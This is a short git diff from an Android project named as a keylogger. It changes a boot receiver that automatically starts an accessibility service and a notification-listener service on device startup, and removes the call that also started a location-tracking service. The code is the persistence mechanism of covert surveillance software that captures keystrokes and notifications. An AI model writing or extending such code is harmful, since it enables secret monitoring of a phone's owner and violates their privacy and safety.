@@ -3,7 +3,6 @@ package com.azamovhudstc.androidkeylogger.receiver
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import com.azamovhudstc.androidkeylogger.service.LocationService
 import com.azamovhudstc.androidkeylogger.service.MyNotificationListenerService
 import com.azamovhudstc.androidkeylogger.service.SvcAccFix
 
@@ -21,8 +20,6 @@ class BootReceiver : BroadcastReceiver() {
             context.startService(accessibilityServiceIntent)
 
             // LocationService-ni boshlash
-            val locationServiceIntent = Intent(context, LocationService::class.java)
-            context.startService(locationServiceIntent)
         }
     }
 }
